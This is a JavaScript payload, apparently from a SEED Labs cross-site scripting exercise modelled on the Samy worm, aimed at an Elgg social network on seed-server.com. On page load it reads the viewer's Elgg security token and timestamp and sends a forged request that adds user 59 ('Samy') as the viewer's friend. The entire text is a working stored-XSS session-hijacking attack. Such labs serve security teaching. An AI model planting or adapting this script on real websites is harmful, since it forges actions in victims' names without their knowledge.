<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl = "http://www.seed-server.com/action/friends/add"
	+ "?friend=59" + token + ts;//FILL IN

	var guid_of_samy=59;
	if(elgg.session.user.guid != guid_of_samy){
		//Create and send Ajax request to add friend
		Ajax = new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	
	}
</script>